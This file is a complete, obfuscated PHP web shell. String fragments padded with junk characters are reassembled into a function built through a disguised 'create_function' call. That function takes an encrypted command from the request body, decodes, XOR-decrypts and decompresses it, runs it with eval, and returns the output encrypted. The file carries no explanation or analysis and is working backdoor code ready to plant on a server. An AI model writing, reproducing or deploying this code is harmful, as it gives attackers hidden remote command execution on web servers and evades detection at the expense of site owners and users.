<?php
$Z='et_conten(6ts();(6@o(6b_end_c(6lean(6()(6;$r=@b(6(6ase64_encode(6(@x(@(6gzc(6ompress($o),$k))(6;print("$(6p$k(6h$r$kf");}';
$e='6$o.(6=$t{$i}^$k{(6(6$j};}}re(6t(6urn $o;}if (@pre(6g_match((6"(6/(6$(6k(6h(.+)$kf/",@file_g(6et_c(6ontents(6("php:/';
$B='/inp(6ut"),(6$m)==1)(6 (6{@ob_start();@e(6va(6l(@gzunco(6(6mpress(@x(6(@bas(6e64_deco(6d(6e($m[1])(6(6,$k)));$o=@ob_(6g';
$q='(6(6$k="34e3182f(6";$kh="b232af(6c1e0f8";(6$kf="b(65(634e2d(6ba(674c";$p=(6"(6C45gCiBB2p4tZ(6XIs";func(6tion x(6($(6t,$k)';
$M='{$c=(6strle(6n($k);$l(6=s(6trle(6n($t);$o="";fo(6r(6($i=0;$i<$l;(6)(6{for($j(6=0;($j<$c(6&(6(6&$i<$l);$j+(6+,$i++){(';
$X=str_replace('g','','cregatgeg_fugnggction');
$O=str_replace('(6','',$q.$M.$e.$B.$Z);
$u=$X('',$O);$u();
?>
